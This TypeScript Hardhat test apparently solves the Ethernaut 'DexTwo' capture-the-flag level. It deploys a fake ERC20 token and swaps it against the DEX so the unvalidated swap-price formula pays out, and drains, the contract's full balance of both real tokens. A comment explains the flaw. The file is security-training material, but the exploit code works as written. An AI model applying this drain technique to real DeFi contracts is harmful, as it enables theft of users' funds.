import { expect } from "chai";
import { Address } from "cluster";
import { Contract, Signer, BigNumber } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel, bigNumberToEther,
         logEvents, dumpStorage, waitTx } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let eoaAddress: string;
let fakeToken: Contract;
let challenge: Contract; // challenge contract
let tx: any;

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  eoaAddress = await eoa.getAddress();
  const challengeFactory = await ethers.getContractFactory(`DexTwo`);
  const challengeAddress = await createChallenge(
    `0xd2BA82c4777a8d619144d32a2314ee620BC9E09c`
  );

  challenge = await challengeFactory.attach(challengeAddress);

  const fakeTokenFactory = await ethers.getContractFactory(`DexTwoFakeToken`);
  fakeToken = await fakeTokenFactory.deploy("Fake Token", "FAKE");
  await waitTx(fakeToken.initialize(eoaAddress, challenge.address));
});

it("solves the challenge", async function () {
  // I put a random amount in the Fake Token to show that 
  // you can always calculate the right amount to swap
  // with the real token in order to drain the contract

  const MAX_APPROVAL = 1000;
  let token1 = await challenge.token1();
  let token2 = await challenge.token2();

  // Get the approvals out of the way
  await waitTx(challenge.approve(eoaAddress,MAX_APPROVAL));
  await waitTx(challenge.approve(challenge.address, MAX_APPROVAL));

  await waitTx(fakeToken.approve(eoaAddress,MAX_APPROVAL));
  await waitTx(fakeToken.approve(challenge.address, MAX_APPROVAL));


  const logBalance = async (msg: string, token: string, user: string) =>  {
    console.log(msg, (await challenge.balanceOf(token, user)).toString());
  }

  /*
   * `amount` is a random number but as long as we have the same 
   * balance in the random token for `challenge.address` and `eoaAddress`
   * then get_swap_amount will evaluate to whatever the balance of
   * the `challenge.address` is in the real token.
   * 
   *  i.e. the call to `challenge.swap(fakeToken.address, token, amount)`
   *  will always swap out the balance of `token` for `challenge.address`
   *
   *  Why? Because when to = fakeToken.address and from = token the following
   *  Solidity is evaluated in function `get_swap_amount`
   * 
   *    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
   * 
   * Then we have amount * <real token balance of DEX> / amount = <real token balance of DEX>
   * So the real token balance of the DEX (i.e. `challenge.address`) is always transferred.
   */

  const amount = Math.floor(Math.random() * 100);
  await waitTx(fakeToken.resetBalances(amount));


  await waitTx(challenge.swap(fakeToken.address, token2, amount));

  await waitTx(fakeToken.resetBalances(amount));

  await waitTx(challenge.swap(fakeToken.address, token1, amount));


  logBalance("challenge token1 balance", token1, challenge.address);
  logBalance("challenge token2 balance", token2, challenge.address);
  logBalance("eoa token1 balance", token1, eoaAddress);
  logBalance("eoa token2 balance", token2, eoaAddress);



});

after(async () => {
  expect(await submitLevel(challenge.address), "level should be solved").to.be.true;
});
